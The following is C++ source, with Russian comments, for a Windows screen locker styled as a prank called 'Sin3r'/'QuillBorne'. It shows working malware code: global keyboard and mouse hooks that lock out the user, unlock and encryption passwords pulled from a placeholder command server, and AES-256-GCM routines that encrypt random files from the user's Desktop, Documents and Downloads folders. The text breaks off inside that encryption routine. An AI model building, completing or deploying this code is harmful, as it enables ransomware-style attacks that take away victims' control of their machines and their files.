#define _CRT_SECURE_NO_WARNINGS
#define NOMINMAX                 // чтобы windows.h не определял макросы min/max
#include <windows.h>
#include <gdiplus.h>
#include <vector>
#include <string>
#include <thread>
#include <chrono>
#include <random>
#include <mutex>
#include <algorithm>
#include <shlobj.h>   // для Desktop
#include <sstream>
#include <iomanip>
#include <cstring>
#include <cstdio>
#include <bcrypt.h>
#include <winhttp.h>

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "winhttp.lib")

// ============================================================
//  СИСТЕМА SIN3R — графический шутник
//  Фазы: LOADING (слайдшоу из assets) -> TERMINAL (эмуляция
//  команд) -> LOCKED (арт + neofetch + мемы + ввод кода)
// ============================================================

enum BootPhase { PHASE_LOADING = 0, PHASE_TERMINAL = 1, PHASE_LOCKED = 2 };
static volatile LONG g_phase = PHASE_LOADING;

HHOOK keyboardHook = NULL;
HHOOK mouseHook = NULL;
HWND mainHwnd = NULL;
HWND hEdit = NULL;
HWND hButton = NULL;
HWND hLabel = NULL;

ULONG_PTR g_gdiToken = 0;
Gdiplus::Image* g_artImg = nullptr;      // неофетч-логотип из art.png
Gdiplus::Image* g_loadingImg = nullptr;  // картинка из assets на экране загрузки

// ---------- Ассеты (установим при загрузке) ----------
std::vector<std::wstring> g_assets;
int g_loadIndex = -1;
int g_loadProgress = 0;
std::wstring g_loadText = L"Sin3r OS — злая графическая оболочка";

// ---------- Терминал ----------
struct TermLine { std::wstring text; bool isCmd; };
std::mutex g_termMutex;
std::vector<TermLine> g_termLines;
std::wstring g_termCurrent;

// Глобальный текущий мем (внизу под neofetch)
std::wstring current_meme =
    L"Мышь и клавиатура заблокированы.\nПопробуй нажать Alt+F4... Я подожду.\n\n- siner";

// Мемные фразы для ротации
std::vector<std::wstring> memes = {
    L"Мышь и клавиатура заблокированы.\nПопробуй нажать Alt+F4... Я подожду.\n\n- siner",
    L"Win+M не работает. И Win+Tab тоже.\n\n- siner",
    L"Даже диспетчер задач не вызовешь.\n\n- siner",
    L"Я заблокировал твою мышку. Кликать бесполезно.\n\n- siner",
    L"Чтобы выйти, жми Ctrl+Alt+Del.\nНу или выключи виртуалку.\n\n- siner",
    L"Обнаружено 999+ вирусов. Все хотят обниматься.\n\n- siner",
    L"Твой компьютер теперь мой. Шутка.\n\n- siner"
};

// --- Коды с сервера (заполняются в FetchCredentialsFromServer) ---
// 8 цифр = пароль разблокировки винлокера
// 6 цифр = пароль шифрования файлов
static std::wstring g_unlockCode   = L"00000000";   // password_8
static std::string  g_filePassword = "000000";      // password_6
static std::wstring g_serial       = L"";

// Адрес сервера (поменяй на свой IP / домен)
static const wchar_t* SERVER_HOST = L"0.0.0.0";
static const INTERNET_PORT SERVER_PORT = 5000;

// Старый fallback, если сервер недоступен
static const wchar_t* FALLBACK_UNLOCK = L"Ryzendd";
static const char*    FALLBACK_FILE_PW = "13827";


// Арабский текст для "кодирования" файла
const wchar_t* ARABIC_GARBAGE =
L"تم تشفير هذا الملف بواسطة siner 😈\n"
L"النظام مقفل. حاول مرة أخرى.\n"
L"هذا النص غير مفهوم عمداً.\n"
L"ملف مشفر — لا تحاول فتحه.\n"
L"سـيـنـر كـان هـنـا\n"
L"████████████████████████████████\n"
L"عربـي غـيـر مـفـهـوم ٠١٢٣٤٥٦٧٨٩\n"
L"تم تشفير المحتوى. النظام مغلق.";

// ---------- НЕОФЕТЧ (реальные данные + немного мемов) ----------
struct NeoLine { COLORREF color; std::wstring text; };
std::vector<NeoLine> g_neoLines;

static const COLORREF paletteBlocks[8] = {
    RGB(60, 60, 60), RGB(255, 80, 80), RGB(255, 200, 70), RGB(120, 255, 120),
    RGB(90, 200, 255), RGB(120, 120, 255), RGB(255, 120, 255), RGB(230, 230, 230)
};

// Собираем реальную информацию о системе
static std::wstring GetUserNameStr() {
    wchar_t buf[256] = {};
    DWORD sz = 256;
    if (GetUserNameW(buf, &sz)) return buf;
    return L"user";
}

static std::wstring GetComputerNameStr() {
    wchar_t buf[256] = {};
    DWORD sz = 256;
    if (GetComputerNameW(buf, &sz)) return buf;
    return L"PC";
}

static std::wstring GetOsVersionStr() {
    // RtlGetVersion — самый надёжный способ узнать настоящую версию
    typedef LONG(WINAPI* RtlGetVersionPtr)(OSVERSIONINFOW*);
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (ntdll) {
        auto fn = (RtlGetVersionPtr)GetProcAddress(ntdll, "RtlGetVersion");
        if (fn) {
            OSVERSIONINFOW rovi = { sizeof(rovi) };
            if (fn(&rovi) == 0) {
                std::wstringstream ss;
                if (rovi.dwMajorVersion == 10 && rovi.dwBuildNumber >= 22000)
                    ss << L"Windows 11";
                else if (rovi.dwMajorVersion == 10)
                    ss << L"Windows 10";
                else
                    ss << L"Windows " << rovi.dwMajorVersion << L"." << rovi.dwMinorVersion;
                ss << L" (build " << rovi.dwBuildNumber << L") x64";
                return ss.str();
            }
        }
    }
    return L"Windows 10/11 x64";
}

static std::wstring GetUptimeStr() {
    ULONGLONG ms = GetTickCount64();
    ULONGLONG sec = ms / 1000;
    ULONGLONG days = sec / 86400;
    ULONGLONG hours = (sec % 86400) / 3600;
    ULONGLONG mins = (sec % 3600) / 60;
    std::wstringstream ss;
    if (days > 0) ss << days << L"d ";
    ss << hours << L"h " << mins << L"m";
    return ss.str();
}

static std::wstring GetCpuName() {
    HKEY hKey = NULL;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        wchar_t buf[512] = {};
        DWORD sz = sizeof(buf);
        if (RegQueryValueExW(hKey, L"ProcessorNameString", NULL, NULL, (LPBYTE)buf, &sz) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            // убираем лишние пробелы
            std::wstring s = buf;
            while (!s.empty() && s.back() == L' ') s.pop_back();
            return s;
        }
        RegCloseKey(hKey);
    }
    return L"Unknown CPU";
}

static std::wstring GetMemoryStr() {
    MEMORYSTATUSEX ms = { sizeof(ms) };
    if (GlobalMemoryStatusEx(&ms)) {
        auto toMiB = [](DWORDLONG b) { return (b / 1024 / 1024); };
        std::wstringstream ss;
        ss << toMiB(ms.ullTotalPhys - ms.ullAvailPhys) << L"MiB / "
           << toMiB(ms.ullTotalPhys) << L"MiB";
        return ss.str();
    }
    return L"? / ? MiB";
}

static void BuildNeoFetch() {
    g_neoLines.clear();

    std::wstring user = GetUserNameStr();
    std::wstring host = GetComputerNameStr();
    std::wstring title = L"sin3r@" + host;

    auto add = [](COLORREF c, const std::wstring& t) {
        g_neoLines.push_back({ c, t });
    };

    add(RGB(170, 255, 90),  title);
    add(RGB(170, 255, 90),  L"──────────────────────────");
    add(RGB(255, 255, 255), L"OS:         " + GetOsVersionStr());
    add(RGB(170, 255, 90),  L"Host:       " + host + L" (оккупирован)");
    add(RGB(170, 255, 90),  L"Kernel:     10.0 (NT)");
    add(RGB(255, 255, 255), L"Uptime:     " + GetUptimeStr());
    add(RGB(255, 100, 100), L"Packages:   999+ (все мемные)");
    add(RGB(255, 255, 255), L"Shell:      siner-sh 7.7.7");
    add(RGB(255, 100, 100), L"Resolution: " +
        std::to_wstring(GetSystemMetrics(SM_CXSCREEN)) + L"x" +
        std::to_wstring(GetSystemMetrics(SM_CYSCREEN)));
    add(RGB(255, 255, 255), L"DE:         Sin3rDE (захват мыши v2)");
    add(RGB(170, 255, 90),  L"Terminal:   эмулятор внутри эмулятора");
    add(RGB(255, 255, 255), L"CPU:        " + GetCpuName());
    add(RGB(170, 255, 90),  L"GPU:        (смотри в диспетчере)");
    add(RGB(255, 255, 255), L"Memory:     " + GetMemoryStr());
}

// ---------- Фейковые команды терминала ----------
struct FakeCmd {
    const wchar_t* cmd;
    std::vector<const wchar_t*> out;
};
static const FakeCmd fakeCmds[] = {
    { L"whoami",                 { L"sin3r (был: гость, стал: хозяином)" } },
    { L"neofetch",               { L"логотип уже на экране 😎" } },
    { L"taskkill /f /im svoboda.exe",
                                 { L"УСПЕХ: процесс \"svoboda.exe\" (PID 404) завершён.",
                                   L"Восстанавливать не собираюсь." } },
    { L"net user Павел /active:no",
                                 { L"Команда выполнена успешно.",
                                   L"Шучу. Успешно — для меня." } },
    { L"ping -t ya.tut.zhivu",   { L"Обмен пакетами с ya.tut.zhivu [127.0.0.1]:",
                                   L"Ответ: число байт=32 время=<∞> TTL=666",
                                   L"Ответ: число байт=32 время=<∞> TTL=666",
                                   L"(Ctrl+C не поможет, я позаботился)" } },
    { L"type секрет.txt",        { L"Павел, привет! Я тут живу теперь.",
                                   L"Код от двери всё тот же — ищи в исходниках 😉" } },
    { L"exit",                   { L"Выход? Как мило.",
                                   L"Попробуй код. Ну или выключи виртуалку.",
                                   L"- siner" } },
};

const wchar_t* bootSteps[] = {
    L"Проверяю... ага, виртуалка. Опять.",
    L"Загружаю кошечку-горничную...",
    L"Отключаю свободу пользователя...",
    L"Синхронизирую мемы...",
    L"Готово. Меня забыли удалить."
};

// ============================================================
//  helpers
// ============================================================
static std::wstring GetExeDir() {
    wchar_t buf[MAX_PATH] = { 0 };
    GetModuleFileNameW(NULL, buf, MAX_PATH);
    std::wstring p = buf;
    size_t s = p.find_last_of(L'\\');
    return (s == std::wstring::npos) ? L"." : p.substr(0, s);
}

static Gdiplus::Image* TryLoadImage(const std::wstring& path) {
    Gdiplus::Image* img = new Gdiplus::Image(path.c_str());
    if (img && img->GetLastStatus() == Gdiplus::Ok) return img;
    delete img;
    return nullptr;
}

//Сканируем папку assets рядом с exe
static std::vector<std::wstring> ScanAssets(const std::wstring& dir) {
    std::vector<std::wstring> out;
    const wchar_t* masks[] = { L"*.png", L"*.jpg", L"*.jpeg", L"*.bmp", L"*.gif" };
    for (const wchar_t* m : masks) {
        WIN32_FIND_DATAW fd;
        HANDLE h = FindFirstFileW((dir + L"\\" + m).c_str(), &fd);
        if (h != INVALID_HANDLE_VALUE) {
            do {
                if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
                    out.push_back(dir + L"\\" + fd.cFileName);
            } while (FindNextFileW(h, &fd));
            FindClose(h);
        }
    }
    std::sort(out.begin(), out.end());
    return out;
}

static HFONT MakeMono(int h, int weight) {
    HFONT f = CreateFontW(h, 0, 0, 0, weight, FALSE, FALSE, FALSE, DEFAULT_CHARSET,
        OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
        FIXED_PITCH | FF_MODERN, L"Consolas");
    if (!f) f = CreateFontW(h, 0, 0, 0, weight, FALSE, FALSE, FALSE, DEFAULT_CHARSET,
        OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
        FIXED_PITCH | FF_MODERN, L"Courier New");
    return f;
}

static void DrawMonoText(HDC hdc, const std::wstring& text, RECT rc, int size,
                         int weight, COLORREF color, UINT flags = DT_CENTER | DT_TOP | DT_WORDBREAK) {
    HFONT f = MakeMono(size, weight);
    HFONT old = (HFONT)SelectObject(hdc, f);
    SetBkMode(hdc, TRANSPARENT);
    SetTextColor(hdc, color);
    DrawTextW(hdc, text.c_str(), -1, &rc, flags);
    SelectObject(hdc, old);
    DeleteObject(f);
}

// Картинка, вписанная в прямоугольник (Drawn по центру горизонтально)
static void DrawImageFitted(HDC hdc, Gdiplus::Image* img, int x, int y, int maxW, int maxH) {
    if (!img) return;
    int iw = img->GetWidth(), ih = img->GetHeight();
    if (iw <= 0 || ih <= 0 || maxW <= 0 || maxH <= 0) return;
    double s = (std::min)(maxW / (double)iw, maxH / (double)ih);
    int w = (int)(iw * s), h = (int)(ih * s);
    Gdiplus::Graphics g(hdc);
    g.SetInterpolationMode(Gdiplus::InterpolationModeHighQualityBicubic);
    g.SetSmoothingMode(Gdiplus::SmoothingModeHighQuality);
    g.DrawImage(img, x + (maxW - w) / 2, y + (maxH - h) / 2, w, h);
}

// ============================================================
//  ХУКИ (без изменений логики блокировки)
// ============================================================
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            bool altPressed = (GetAsyncKeyState(VK_MENU) & 0x8000) != 0;
            bool ctrlPressed = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
            bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;

            // Всегда блокируем опасные комбинации
            if (p->vkCode == VK_LWIN || p->vkCode == VK_RWIN) return 1;
            if (altPressed && p->vkCode == VK_F4) return 1;
            if (ctrlPressed && shiftPressed && p->vkCode == VK_ESCAPE) return 1;
            if (altPressed && p->vkCode == VK_TAB) return 1;
            if (ctrlPressed && p->vkCode == VK_ESCAPE) return 1;

            // Tab и Space блокируем только до фазы LOCKED,
            // чтобы в поле ввода кода можно было нормально работать
            if (g_phase != PHASE_LOCKED) {
                if (p->vkCode == VK_TAB || p->vkCode == VK_SPACE) return 1;
            }

            // Enter — проверка кода (работает даже без мыши)
            if (p->vkCode == VK_RETURN) {
                PostMessage(mainHwnd, WM_USER + 1, 0, 0);
            }
        }
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        return 1;
    }
    return CallNextHookEx(mouseHook, nCode, wParam, lParam);
}

// ============================================================
//  Связь с сервером серийных номеров
//  GET /register?serial=QB-XXXX  →  { password_6, password_8, serial }
// ============================================================
static std::string HttpGet(const std::wstring& host, INTERNET_PORT port, const std::wstring& path) {
    std::string result;
    HINTERNET hSession = WinHttpOpen(L"QuillBorne/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return result;

    // короткий таймаут — не зависаем если сервер выключен
    DWORD timeout = 3000;
    WinHttpSetTimeouts(hSession, timeout, timeout, timeout, timeout);

    HINTERNET hConnect = WinHttpConnect(hSession, host.c_str(), port, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return result; }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path.c_str(),
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return result;
    }

    BOOL ok = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                 WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (ok) ok = WinHttpReceiveResponse(hRequest, NULL);

    if (ok) {
        DWORD dwSize = 0;
        do {
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize) || dwSize == 0) break;
            std::vector<char> buf(dwSize + 1, 0);
            DWORD dwRead = 0;
            if (!WinHttpReadData(hRequest, buf.data(), dwSize, &dwRead)) break;
            result.append(buf.data(), dwRead);
        } while (dwSize > 0);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return result;
}

static std::string JsonGetString(const std::string& json, const char* key) {
    // простой парсер: "key": "value" или "key":"value"
    std::string pattern = std::string("\"") + key + "\"";
    size_t pos = json.find(pattern);
    if (pos == std::string::npos) return "";
    pos = json.find(':', pos + pattern.size());
    if (pos == std::string::npos) return "";
    pos = json.find('"', pos + 1);
    if (pos == std::string::npos) return "";
    size_t end = json.find('"', pos + 1);
    if (end == std::string::npos) return "";
    return json.substr(pos + 1, end - pos - 1);
}

static std::wstring MakeLocalSerial() {
    // QB- + 8 случайных символов
    static const wchar_t chars[] = L"ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
    std::wstring s = L"QB-";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<int> dist(0, (int)(sizeof(chars)/sizeof(chars[0]) - 2));
    for (int i = 0; i < 8; i++) s += chars[dist(gen)];
    return s;
}

static std::wstring LoadOrCreateSerial() {
    wchar_t path[MAX_PATH] = {};
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
        std::wstring file = std::wstring(path) + L"\\QuillBorne\\serial.txt";
        CreateDirectoryW((std::wstring(path) + L"\\QuillBorne").c_str(), NULL);
        HANDLE h = CreateFileW(file.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (h != INVALID_HANDLE_VALUE) {
            char buf[64] = {};
            DWORD rd = 0;
            ReadFile(h, buf, 63, &rd, NULL);
            CloseHandle(h);
            if (rd > 0) {
                int need = MultiByteToWideChar(CP_UTF8, 0, buf, rd, NULL, 0);
                std::wstring w(need, 0);
                MultiByteToWideChar(CP_UTF8, 0, buf, rd, &w[0], need);
                while (!w.empty() && (w.back() == L'\n' || w.back() == L'\r' || w.back() == L' ')) w.pop_back();
                if (!w.empty()) return w;
            }
        }
        // создать новый
        std::wstring serial = MakeLocalSerial();
        h = CreateFileW(file.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        if (h != INVALID_HANDLE_VALUE) {
            std::string narrow(serial.begin(), serial.end());
            DWORD wr = 0;
            WriteFile(h, narrow.data(), (DWORD)narrow.size(), &wr, NULL);
            CloseHandle(h);
        }
        return serial;
    }
    return MakeLocalSerial();
}

// Запрашивает у сервера пароли. При ошибке — fallback.
static bool FetchCredentialsFromServer() {
    g_serial = LoadOrCreateSerial();

    std::wstring path = L"/register?serial=" + g_serial;
    std::string json = HttpGet(SERVER_HOST, SERVER_PORT, path);

    if (json.empty() || json.find("password_8") == std::string::npos) {
        // сервер недоступен — fallback
        g_unlockCode = FALLBACK_UNLOCK;
        g_filePassword = FALLBACK_FILE_PW;
        return false;
    }

    std::string p6 = JsonGetString(json, "password_6");
    std::string p8 = JsonGetString(json, "password_8");
    std::string ser = JsonGetString(json, "serial");

    if (p6.size() >= 4 && p8.size() >= 4) {
        g_filePassword = p6;
        // password_8 → wide
        int need = MultiByteToWideChar(CP_UTF8, 0, p8.c_str(), -1, NULL, 0);
        g_unlockCode.assign(need - 1, 0);
        MultiByteToWideChar(CP_UTF8, 0, p8.c_str(), -1, &g_unlockCode[0], need);
        if (!ser.empty()) {
            need = MultiByteToWideChar(CP_UTF8, 0, ser.c_str(), -1, NULL, 0);
            g_serial.assign(need - 1, 0);
            MultiByteToWideChar(CP_UTF8, 0, ser.c_str(), -1, &g_serial[0], need);
        }
        return true;
    }

    g_unlockCode = FALLBACK_UNLOCK;
    g_filePassword = FALLBACK_FILE_PW;
    return false;
}

// ============================================================
//  AES-256-GCM шифрование / расшифровка файлов
//  Пароль: 13827
//  Формат совместим с tools/file_encryptor.py (MAGIC "FENC")
// ============================================================
static const char* ENCRYPT_PASSWORD() { return g_filePassword.c_str(); }
static const ULONG ENC_SALT_SIZE = 16;
static const ULONG ENC_NONCE_SIZE = 12;
static const ULONG ENC_KEY_SIZE = 32;
static const ULONG ENC_TAG_SIZE = 16;
static const ULONG ENC_PBKDF2_ITERS = 600000;
static const size_t MAX_ENCRYPT_FILES = 5;
static const ULONGLONG MAX_FILE_BYTES = 30ull * 1024 * 1024; // 30 MB

// Список зашифрованных файлов: {путь.enc, оригинальное_имя_для_восстановления}
struct EncRecord {
    std::wstring encPath;
    std::wstring originalPath;
};
static std::vector<EncRecord> g_encRecords;
static std::mutex g_encMutex;

static bool DeriveKey(const char* password, const BYTE* salt, BYTE* outKey) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    NTSTATUS st = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG);
    if (st < 0) return false;
    st = BCryptDeriveKeyPBKDF2(hAlg,
        (PUCHAR)password, (ULONG)strlen(password),
        (PUCHAR)salt, ENC_SALT_SIZE,
        ENC_PBKDF2_ITERS, outKey, ENC_KEY_SIZE, 0);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return st >= 0;
}

static bool AesGcmEncryptFile(const std::wstring& srcPath, const std::wstring& dstPath) {
    HANDLE hSrc = CreateFileW(srcPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hSrc == INVALID_HANDLE_VALUE) return false;

    LARGE_INTEGER liSize = {};
    if (!GetFileSizeEx(hSrc, &liSize) || liSize.QuadPart <= 0 || (ULONGLONG)liSize.QuadPart > MAX_FILE_BYTES) {
        CloseHandle(hSrc);
        return false;
    }

    std::vector<BYTE> plain((size_t)liSize.QuadPart);
    DWORD read = 0;
    if (!ReadFile(hSrc, plain.data(), (DWORD)plain.size(), &read, NULL) || read != plain.size()) {
        CloseHandle(hSrc);
        return false;
    }
    CloseHandle(hSrc);

    BYTE salt[16], nonce[12], key[32];
    if (BCryptGenRandom(NULL, salt, ENC_SALT_SIZE, BCRYPT_USE_SYSTEM_PREFERRED_RNG) < 0) return false;
    if (BCryptGenRandom(NULL, nonce, ENC_NONCE_SIZE, BCRYPT_USE_SYSTEM_PREFERRED_RNG) < 0) return false;
    if (!DeriveKey(ENCRYPT_PASSWORD(), salt, key)) return false;

    BCRYPT_ALG_HANDLE hAes = NULL;
    if (BCryptOpenAlgorithmProvider(&hAes, BCRYPT_AES_ALGORITHM, NULL, 0) < 0) return false;
    if (BCryptSetProperty(hAes, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0) < 0) {
        BCryptCloseAlgorithmProvider(hAes, 0); return false;
    }

    BCRYPT_KEY_HANDLE hKey = NULL;
    if (BCryptGenerateSymmetricKey(hAes, &hKey, NULL, 0, key, ENC_KEY_SIZE, 0) < 0) {
        BCryptCloseAlgorithmProvider(hAes, 0); return false;
    }

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = nonce;
    authInfo.cbNonce = ENC_NONCE_SIZE;
    BYTE tag[16] = {};
    authInfo.pbTag = tag;
    authInfo.cbTag = ENC_TAG_SIZE;

    std::vector<BYTE> cipher(plain.size());
    ULONG cbResult = 0;
    NTSTATUS st = BCryptEncrypt(hKey, plain.data(), (ULONG)plain.size(), &authInfo,
                                NULL, 0, cipher.data(), (ULONG)cipher.size(), &cbResult, 0);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAes, 0);
    if (st < 0) return false;

    HANDLE hDst = CreateFileW(dstPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDst == INVALID_HANDLE_VALUE) return false;

    DWORD written = 0;
    const BYTE magic[4] = { 'F', 'E', 'N', 'C' };
    const BYTE ver = 1, algo = 1;
    WriteFile(hDst, magic, 4, &written, NULL);
    WriteFile(hDst, &ver, 1, &written, NULL);
    WriteFile(hDst, &algo, 1, &written, NULL);
    WriteFile(hDst, salt, ENC_SALT_SIZE, &written, NULL);
    WriteFile(hDst, nonce, ENC_NONCE_SIZE, &written, NULL);
    WriteFile(hDst, cipher.data(), cbResult, &written, NULL);
    WriteFile(hDst, tag, ENC_TAG_SIZE, &written, NULL);
    CloseHandle(hDst);
    return true;
}

static bool AesGcmDecryptFile(const std::wstring& srcPath, const std::wstring& dstPath, const char* password) {
    HANDLE hSrc = CreateFileW(srcPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hSrc == INVALID_HANDLE_VALUE) return false;

    LARGE_INTEGER liSize = {};
    GetFileSizeEx(hSrc, &liSize);
    const ULONGLONG headerSize = 4 + 1 + 1 + ENC_SALT_SIZE + ENC_NONCE_SIZE + ENC_TAG_SIZE;
    if ((ULONGLONG)liSize.QuadPart < headerSize) { CloseHandle(hSrc); return false; }

    std::vector<BYTE> buf((size_t)liSize.QuadPart);
    DWORD read = 0;
    if (!ReadFile(hSrc, buf.data(), (DWORD)buf.size(), &read, NULL) || read != buf.size()) {
        CloseHandle(hSrc); return false;
    }
    CloseHandle(hSrc);

    size_t off = 0;
    if (memcmp(buf.data(), "FENC", 4) != 0) return false;
    off += 4;
    BYTE ver = buf[off++], algo = buf[off++];
    if (ver != 1 || algo != 1) return false;

    BYTE salt[16], nonce[12], key[32];
    memcpy(salt, buf.data() + off, ENC_SALT_SIZE); off += ENC_SALT_SIZE;
    memcpy(nonce, buf.data() + off, ENC_NONCE_SIZE); off += ENC_NONCE_SIZE;

    size_t ctLen = buf.size() - off - ENC_TAG_SIZE;
    BYTE* cipher = buf.data() + off;
    BYTE* tag = buf.data() + off + ctLen;

    if (!DeriveKey(password, salt, key)) return false;

    BCRYPT_ALG_HANDLE hAes = NULL;
    if (BCryptOpenAlgorithmProvider(&hAes, BCRYPT_AES_ALGORITHM, NULL, 0) < 0) return false;
    if (BCryptSetProperty(hAes, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0) < 0) {
        BCryptCloseAlgorithmProvider(hAes, 0); return false;
    }
    BCRYPT_KEY_HANDLE hKey = NULL;
    if (BCryptGenerateSymmetricKey(hAes, &hKey, NULL, 0, key, ENC_KEY_SIZE, 0) < 0) {
        BCryptCloseAlgorithmProvider(hAes, 0); return false;
    }

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = nonce;
    authInfo.cbNonce = ENC_NONCE_SIZE;
    authInfo.pbTag = tag;
    authInfo.cbTag = ENC_TAG_SIZE;

    std::vector<BYTE> plain(ctLen);
    ULONG cbResult = 0;
    NTSTATUS st = BCryptDecrypt(hKey, cipher, (ULONG)ctLen, &authInfo,
                                NULL, 0, plain.data(), (ULONG)plain.size(), &cbResult, 0);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAes, 0);
    if (st < 0) return false;

    HANDLE hDst = CreateFileW(dstPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDst == INVALID_HANDLE_VALUE) return false;
    DWORD written = 0;
    WriteFile(hDst, plain.data(), cbResult, &written, NULL);
    CloseHandle(hDst);
    return true;
}

static bool IsSafeToEncrypt(const std::wstring& path) {
    // Только обычные файлы, не папки, не .enc, не исполняемые/системные
    DWORD attr = GetFileAttributesW(path.c_str());
    if (attr == INVALID_FILE_ATTRIBUTES) return false;
    if (attr & (FILE_ATTRIBUTE_DIRECTORY | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN)) return false;

    std::wstring lower = path;
    for (auto& c : lower) if (c >= L'A' && c <= L'Z') c += 32;

    // расширения, которые не трогаем
    static const wchar_t* badExt[] = {
        L".exe", L".dll", L".sys", L".drv", L".msi", L".bat", L".cmd", L".ps1",
        L".scr", L".com", L".cpl", L".ocx", L".enc", L".lnk", L".url",
        L".iso", L".img", L".vhd", L".vhdx", L".efi", L".bin"
    };
    for (auto ext : badExt) {
        size_t n = wcslen(ext);
        if (lower.size() >= n && lower.compare(lower.size() - n, n, ext) == 0)
            return false;
    }
    return true;
}

static void CollectCandidateFiles(const std::wstring& dir, std::vector<std::wstring>& out) {
    WIN32_FIND_DATAW fd;
    HANDLE h = FindFirstFileW((dir + L"\\*").c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return;
    do {
        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) continue;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;

        std::wstring full = dir + L"\\" + fd.cFileName;
        if (!IsSafeToEncrypt(full)) continue;

        ULARGE_INTEGER sz;
        sz.LowPart = fd.nFileSizeLow;
        sz.HighPart = fd.nFileSizeHigh;
        if (sz.QuadPart == 0 || sz.QuadPart > MAX_FILE_BYTES) continue;

        out.push_back(full);
    } while (FindNextFileW(h, &fd));
    FindClose(h);
}

// Шифрует до MAX_ENCRYPT_FILES случайных файлов из Desktop / Documents / Downloads
void EncryptRandomUserFiles() {
    std::vector<std::wstring> candidates;

    wchar_t path[MAX_PATH];
    // Desktop
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, path)))
        CollectCandidateFiles(path, candidates);
    // Documents
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_MYDOCUMENTS, NULL, 0, path)))
        CollectCandidateFiles(path, candidates);
    // Downloads (Vista+)
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, path)))
        CollectCandidateFiles(std::wstring(path) + L"\\Downloads", candidates);

    if (candidates.empty()) {
        // fallback: просто создаём quillborne_secret.enc
        wchar_t desk[MAX_PATH] = {};
        SHGetFolderPathW(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desk);
        std::wstring dummy = std::wstring(desk) + L"\\quillborne_secret.enc";
        std::string payload = "QuillBorne was here. No suitable files found.\n";
        // минимальный encrypt через временный plaintext-файл в памяти уже есть в AesGcmEncryptFile —
        // запишем payload во временный файл
        wchar_t tmp[MAX_PATH];
        GetTempPathW(MAX_PATH, tmp);
        std::wstring tmpFile = std::wstring(tmp) + L"qb_payload.txt";
